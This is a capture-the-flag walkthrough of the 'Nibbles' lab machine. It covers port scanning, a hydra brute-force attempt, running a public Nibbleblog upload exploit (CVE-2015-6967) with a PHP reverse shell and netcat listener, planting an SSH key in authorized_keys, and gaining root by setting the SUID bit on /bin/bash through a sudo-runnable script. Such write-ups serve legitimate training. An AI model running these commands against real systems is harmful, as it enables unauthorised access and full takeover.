Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.10.75 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn
sudo nmap -sU 10.10.10.75 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn
```

<br />
<br />
<br />

The UDP scan didn't return anything.

<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.75 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

![](/assets/Nibbles/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 7.2p2**
+ **80/tcp Apache httpd 2.4.18**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.75 -p 22,80 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```

<br />

The scan reports nothing interesting.

<br />

### Foothold

The foothold in this machine was **misleading**, as we will find a **blacklist protection** in the **login panel**, but we are not supposed to evade it, what I tried for quite a while. We have to **make assumptions**.

<br />

Although the SSH service is vulnerable to user enumeration, we won't get nothing from it, so let's go after the website. This is the first thing we will see in it:
<br />
![](/assets/Nibbles/3.png)
<br />
<br />
<br />

This is pretty much nothing, however if we take a look at the **source code** we will find an interesting piece of information:
<br />
![](/assets/Nibbles/4.png)
<br />
<br />
<br />

Great, let's take a look at this ***/nibbleblog/* directory**:
<br />
![](/assets/Nibbles/5.png)
<br />
<br />
<br />

It seems like a common blog site, however there are no posts to help us in user enumeration. But we can look for this blog site in Google, just to find it's **GitHub repository** and a **CVE**:
<br />
![](/assets/Nibbles/6.png)
<br />
<br />
<br />

**CVE-2015-6967**, interesting, but we **don't know the version of the software yet**, so let's not jump into conclusions, however, we can still read it, it seems that this exploit upload a PHP plugin and execute it, it could helps us in getting a reverse shell, however it requires credentials. Let's take a look at the **GitHub repository**:
<br />
![](/assets/Nibbles/7.png)
<br />
<br />
<br />

We've got some files and directories, let's take a look at ***install.php* file** in the web server, as it can allow us to reinstall the service with our own defined credentials:
<br />
![](/assets/Nibbles/8.png)
<br />
<br />
<br />

Sadly, this is not the case, however we can go for the ***update.php* file** as we are being redirected:
<br />
![](/assets/Nibbles/9.png)
<br />
<br />
<br />

Nice, we got the **service version**, and it's the vulnerable one!! However, we still need credentials. Let's check the files pointed out in the ***private* directory** of the message:
<br />
![](/assets/Nibbles/10.png)
<br />
<br />
<br />

We've got some files, but there is an specially interesting one, ***users.xml***, as we are **looking after credentials**:
<br />
![](/assets/Nibbles/11.png)
<br />
<br />
<br />

Bingo! **Username *admin***, but still missing the password. After searching for default credentials and other vulnerabilities I tried brute forcing the **login panel *admin.php*** using hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form '/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect' -I
```

![](/assets/Nibbles/12.png)
<br />
<br />
<br />

However, a big surprise arised, we have been blocked by a **blacklist**:
<br />
![](/assets/Nibbles/13.png)
<br />
<br />
<br />

I tried a more **slowly approach for brute forcing**, but it didn't work, so, after waiting a cooldown period, I tried the **name of the machine in lowercase as the password**, and it worked:
<br />
![](/assets/Nibbles/14.png)
<br />
<br />
<br />

Let's now download and run the [script](https://github.com/dix0nym/CVE-2015-6967) we previously saw alongside the [**pentest monkey PHP reverse shell**](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), also let's open a **listener** for our reverse shell:
```bash
git clone https://github.com/dix0nym/CVE-2015-6967.git
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload ../monkey.php
```

```bash
rlwrap nc -nlvp 4444
```

![](/assets/Nibbles/15.png)
<br />
<br />
<br />

And just like this we have gained access to the machine, however, as there is an SSH service, let's use it before grabbing the flag, I'm going to connect by **creating SSH keys** for our user and the pasting my SSH public key into its ***authorized_keys* file**:
```bash
cat ~/.ssh/id_ed25519.pub | xclip -sel clip
```

```bash
ssh-keygen
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpE4QtZoJ4GLwvKxM3BUvFKp/pI5lKsK34c+4m6AhZg tanades@kali" >> /home/nibbler/.ssh/authorized_keys
```
<br />

Let's now **connect with SSH** and **print the flag**:
```bash
ssh nibbler@10.10.10.75
```

<br />
<br />
<br />

<br />
### Privilege Escalation

The privilege escalation for this machine is **very easy**, we just have to read file permissions.

<br />

Enumerating this user's sudo privileges, we can see that we can use **``sudo``  for a specific file**:
```bash
sudo -l
```

![](/assets/Nibbles/17.png)
<br />
<br />
<br />

This file is **compressed in a zip file** in our **home directory**:
```bash
unzip personal.zip
```

![](/assets/Nibbles/18.png)
<br />
<br />
<br />

We have **write permissions** over the ***stuff* directory**, so we can create an **arbitrary script and run it with ``sudo``**:
<br />
![](/assets/Nibbles/19.png)
<br />
<br />
<br />

We will establish the **SUID bit** in the ***/bin/bash* file** and then leverage it:
```bash
rm /home/nibbler/personal/stuff/monitor.sh
echo "chmod u+s /bin/bash" > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

![](/assets/Nibbles/20.png)
<br />
<br />
<br />

Great, we can see that the **SUID bit is set**, let's now leverage it, **impersonate root** and grab the flag:
```bash
bash -p
```

<br />
<br />
